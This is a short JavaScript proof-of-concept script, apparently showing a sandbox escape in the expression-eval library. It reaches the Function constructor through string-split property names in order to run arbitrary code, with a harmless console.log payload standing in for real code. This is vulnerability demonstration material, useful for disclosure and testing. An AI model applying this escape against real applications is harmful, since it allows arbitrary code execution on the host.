const ev = require('expression-eval');
//const ast = ev.parse(`("").constructor.constructor("console.log('i am in ur logs')")()`);
const ast = ev.parse(`("")["const" + "ructor"]["c" + "onstructor"]("console.log('i am in ur logs')")()`);
//console.log(ast);
const result = ev.eval(ast);
console.log(result);